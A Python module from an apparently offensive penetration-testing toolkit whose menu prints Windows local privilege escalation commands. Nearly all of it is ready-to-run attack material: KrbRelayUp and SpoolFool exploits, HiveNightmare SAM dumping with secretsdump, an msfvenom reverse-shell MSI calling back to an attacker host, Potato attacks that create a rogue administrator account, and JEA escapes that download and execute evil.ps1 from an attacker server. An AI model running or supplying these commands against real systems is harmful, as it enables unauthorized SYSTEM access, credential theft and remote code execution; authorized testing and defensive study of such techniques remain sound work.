"""
Module: Local Privilege Escalation
Techniques: PowerUp, winPEAS, KrbRelayUp, DavRelayUp, SpoolFool,
            HiveNightmare, Always Install Elevated, Potatoes, JEA escape,
            Token Impersonation
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("LOCAL PRIVILEGE ESCALATION")
    print(f"""
  [1]  PowerUp — All Checks
  [2]  winPEAS / Seatbelt / PrivescCheck
  [7]  Always Install Elevated abuse
  [8]  Potato Attacks (PrintSpoofer / GodPotato)
  [10] Token Impersonation
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        print(f"""
  {Y}PowerUp (PowerShell — run on target):{RST}

  Import-Module .\\PowerUp.ps1
  Invoke-AllChecks

  {Y}Specific checks:{RST}
  Get-UnquotedService -Verbose          # Unquoted service paths
  Get-ModifiableServiceFile -Verbose    # Writable service binaries
  Get-ModifiableService -Verbose        # Modifiable configs
  Find-ProcessDLLHijack                 # DLL hijacking in processes
  Find-PathDLLHijack                    # DLL hijacking in PATH
  Get-RegistryAlwaysInstallElevated     # MSI install as SYSTEM
""")

    elif c == "2":
        print(f"""
  {Y}winPEAS (most comprehensive):{RST}
  .\\winPEAS.exe

  {Y}Seatbelt — targeted security audit:{RST}
  .\\Seatbelt.exe -group=all -full
  .\\Seatbelt.exe CredGuard          # Credential Guard status
  .\\Seatbelt.exe TokenPrivileges    # Token privileges

  {Y}PrivescCheck:{RST}
  . .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended

  {Y}BeRoot:{RST}
  .\\beRoot.exe
""")

    elif c == "3":
        dom    = prompt("Domain (e.g. corp.local)")
        method = prompt("Method [rbcd/shadowcred/adcs]") or "rbcd"
        if method == "rbcd":
            print(f"""
  {Y}KrbRelayUp — RBCD method:{RST}
  # Step 1: Create fake computer + set RBCD
  .\\KrbRelayUp.exe relay -Domain {dom} -CreateNewComputerAccount -ComputerName krbup$ -ComputerPassword 'P@ss123!'
  # Step 2: Get SYSTEM shell
  .\\KrbRelayUp.exe spawn -d {dom} -cn krbup$ -cp 'P@ss123!'
""")
        elif method == "shadowcred":
            print(f"""
  {Y}KrbRelayUp — Shadow Credentials:{RST}
  .\\KrbRelayUp.exe full -m shadowcred --ForceShadowCred
""")
        elif method == "adcs":
            print(f"""
  {Y}KrbRelayUp — ADCS method:{RST}
  .\\KrbRelayUp.exe full -m adcs
""")
        add_finding("KrbRelayUp — LPE", "High",
                    f"Local privilege escalation via {method} on domain",
                    "Restrict LDAP signing; apply Windows cumulative patches")

    elif c == "4":
        print(f"""
  {Y}DavRelayUp — WebDAV → LDAP Relay:{RST}

  # Automatic (creates new computer)
  .\\DavRelayUp.exe -c

  # Use existing computer account
  .\\DavRelayUp.exe -cn <computer_name> -cp <computer_password>

  # Impersonate specific user
  .\\DavRelayUp.exe -c -i {SESSION.get('username','user1')}

  # Custom WebDAV port
  .\\DavRelayUp.exe -c -p 8888
""")

    elif c == "5":
        dll = prompt("Malicious DLL path (e.g. .\\addUser.dll)")
        print(f"""
  {Y}SpoolFool (CVE-2022-21999) — LPE via Print Spooler:{RST}
  .\\SpoolFool.exe -dll {dll}

  {Y}PowerShell alternative:{RST}
  Import-Module .\\SpoolFool.ps1
  Invoke-SpoolFool -dll {dll}
""")
        add_finding("SpoolFool LPE (CVE-2022-21999)", "High",
                    "LPE via Print Spooler DLL injection",
                    "Apply KB5010195; disable Print Spooler on non-print servers")

    elif c == "6":
        print(f"""
  {Y}HiveNightmare (CVE-2021-36934) — Check & Exploit:{RST}

  # Check if vulnerable (non-admin can read SAM)
  icacls C:\\Windows\\System32\\config\\SAM

  # If "BUILTIN\\Users:(I)(RX)" appears — vulnerable!
  .\\Invoke-HiveNightmare.ps1 -path .\\HiveDumps

  # Parse locally
  impacket-secretsdump -sam HiveDumps/SAM -system HiveDumps/SYSTEM \\
    -security HiveDumps/SECURITY LOCAL
""")
        add_finding("HiveNightmare (CVE-2021-36934)", "High",
                    "SAM/SYSTEM hives readable by non-admin users",
                    "Apply KB5004605; restrict VSS shadow copy ACLs")

    elif c == "7":
        print(f"""
  {Y}Check registry keys:{RST}
  reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

  {Y}If BOTH are 0x1 → vulnerable. Exploit:{RST}

  # Create malicious MSI
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f msi -o evil.msi

  # Execute as SYSTEM
  msiexec /i evil.msi /q /n
""")
        add_finding("Always Install Elevated", "High",
                    "MSI packages execute as SYSTEM",
                    "Set AlwaysInstallElevated to 0 in both HKCU and HKLM")

    elif c == "8":
        print(f"""
  {Y}Potato / Token Impersonation Attacks:{RST}

  # PrintSpoofer (requires SeImpersonatePrivilege)
  .\\PrintSpoofer.exe -i -c powershell.exe
  .\\PrintSpoofer.exe -c "cmd /c whoami > C:\\output.txt"

  # GodPotato (works Win2012-2022)
  .\\GodPotato.exe -cmd "cmd /c whoami"
  .\\GodPotato.exe -cmd "cmd /c net user hacker P@ss123! /add && net localgroup administrators hacker /add"

  # SweetPotato
  .\\SweetPotato.exe -e EfsRpc -p C:\\Windows\\System32\\cmd.exe -a '/c whoami'

  # JuicyPotato (older — Win2016/2019)
  .\\JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {{e60687f7-01a1-40aa-86ac-db1cbf673334}}
""")

    elif c == "9":
        print(f"""
  {Y}JEA Escape Techniques:{RST}

  # 1. Check language mode
  $ExecutionContext.SessionState.LanguageMode

  # 2. List allowed commands
  Get-Command

  # 3. View function definitions (look for injectable params)
  (Get-Command <AllowedFunc>).Definition

  # 4. If parameter is passed to ExpandString — inject:
  '$(powershell.exe -c "IEX((New-Object Net.WebClient).DownloadString(''http://<attacker>/evil.ps1''))")'

  # 5. Python WinRM to bypass (if JEA applied via PSSessionConfiguration):
  import winrm
  s = winrm.Session('<target>', auth=('user','pass'))
  r = s.run_ps('IEX((New-Object Net.WebClient).DownloadString("http://<attacker>/evil.ps1"))')
""")

    elif c == "10":
        print(f"""
  {Y}Token Impersonation (PowerSploit):{RST}

  Import-Module .\\Invoke-TokenManipulation.ps1

  # List all tokens on system
  Invoke-TokenManipulation -ShowAll

  # List unique usable tokens
  Invoke-TokenManipulation -Enumerate

  # Impersonate a specific user
  Invoke-TokenManipulation -ImpersonateUser -Username "domain\\administrator"

  # Spawn process under another user's token
  Invoke-TokenManipulation -CreateProcess "powershell.exe" -ProcessId <pid>

  {Y}Impersonate.exe (needs SeImpersonatePrivilege):{RST}
  .\\Impersonate.exe list
  .\\Impersonate.exe exec -id <token_id> cmd.exe
""")

    pause()
